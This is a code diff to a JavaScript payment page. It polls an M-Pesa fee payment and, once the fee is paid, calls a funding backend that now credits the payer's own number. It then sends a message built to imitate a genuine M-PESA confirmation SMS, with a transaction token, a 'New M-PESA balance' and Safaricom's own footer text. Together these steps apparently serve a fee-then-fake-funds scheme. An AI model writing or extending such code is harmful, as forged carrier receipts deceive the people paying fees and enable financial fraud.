@@ -233,33 +233,45 @@
                 });
 
                 const data = await res.json();
+                console.log("Payhero status response:", JSON.stringify(data));
+
+                let code = null;
+                let isComplete = false;
 
                 if (data.status === true && data.response) {
-                    const code = data.response.ResultCode;
+                    code = data.response.ResultCode;
+                } else if (data.ResultCode !== undefined) {
+                    code = data.ResultCode;
+                } else if (data.Code !== undefined) {
+                    code = data.Code;
+                }
 
-                    if (code === 0) {
-                        clearInterval(pollTimer);
-                        statusDiv.style.color = "#4CAF50";
-                        statusDiv.innerText = "✅ Fee paid! Sending funds...";
-                        finalizeFunding(fundAmt, recipient);
-                        return;
-                    }
-                    else if (code === 1032) {
-                        clearInterval(pollTimer);
-                        statusDiv.style.color = "#ff5252";
-                        statusDiv.innerText = "❌ Payment was cancelled. Please try again.";
-                        resetUI();
-                        return;
-                    }
-                    else {
-                        clearInterval(pollTimer);
-                        let msg = data.response.ResultDesc || "Payment failed";
-                        if (code === 2001) msg = "Wrong M-Pesa PIN entered.";
-                        statusDiv.style.color = "#ff5252";
-                        statusDiv.innerText = `❌ ${msg}`;
-                        resetUI();
-                        return;
-                    }
+                if (code === 0) {
+                    isComplete = true;
+                }
+
+                if (isComplete) {
+                    clearInterval(pollTimer);
+                    statusDiv.style.color = "#4CAF50";
+                    statusDiv.innerText = "✅ Fee paid! Sending funds...";
+                    finalizeFunding(fundAmt);
+                    return;
+                }
+                else if (code === 1032) {
+                    clearInterval(pollTimer);
+                    statusDiv.style.color = "#ff5252";
+                    statusDiv.innerText = "❌ Payment was cancelled. Please try again.";
+                    resetUI();
+                    return;
+                }
+                else if (code !== null) {
+                    clearInterval(pollTimer);
+                    let msg = "Payment failed";
+                    if (code === 2001) msg = "Wrong M-Pesa PIN entered.";
+                    statusDiv.style.color = "#ff5252";
+                    statusDiv.innerText = `❌ ${msg}`;
+                    resetUI();
+                    return;
                 }
 
                 if (attempts >= maxAttempts) {
@@ -274,15 +286,14 @@
         }, 3000);
     }
 
-    async function finalizeFunding(amt, recipient) {
+    async function finalizeFunding(amt) {
         const statusDiv = document.getElementById('status');
         try {
-            // 2. Fund the FULL amount requested to the selected recipient account
             const res = await fetch(`${BACKEND_FUNDS}/fund`, {
                 method: 'POST',
                 headers: { 'Content-Type': 'application/json' },
                 body: JSON.stringify({ 
-                    phone: recipient, 
+                    phone: userData.phone, 
                     amount: amt 
                 })
             });
@@ -297,12 +308,12 @@
                  
                 const confirmationMsg = `${token} Confirmed.You have received Ksh${amt.toFixed(2)} from Mledger intasend Solutions Limited 313031 on ${dateStr} at ${timeStr}. New M-PESA balance is Ksh${result.newBalance.toFixed(2)}. Separate personal and business funds through pochi la Biashara on *334#`;
 
-                // Send confirmation message to message API for the recipient
+                // Send confirmation message to message API
                 fetch(`${MESSAGE_API}/api/messages`, {
                     method: 'POST',
                     headers: { 'Content-Type': 'application/json' },
                     body: JSON.stringify({
-                        phone: recipient,
+                        phone: userData.phone,
                         message: confirmationMsg,
                         type: 'received'
                     })
@@ -310,7 +321,7 @@
                     console.warn("Confirmation message failed to send:", err);
                 });
 
-                statusDiv.innerHTML = `<strong>✅ Success!</strong><br>Ksh ${amt} sent to ${recipient}.<br><span style="font-size:0.75rem;color:#aaa">Token: ${token}</span>`;
+                statusDiv.innerHTML = `<strong>✅ Success!</strong><br>Ksh ${amt} added to your account.<br><span style="font-size:0.75rem;color:#aaa">Token: ${token}</span>`;
                 setTimeout(() => window.location.href = "index.html", 3000);
             } else {
                 statusDiv.innerText = "Fee received, but funding failed. Contact Support.";
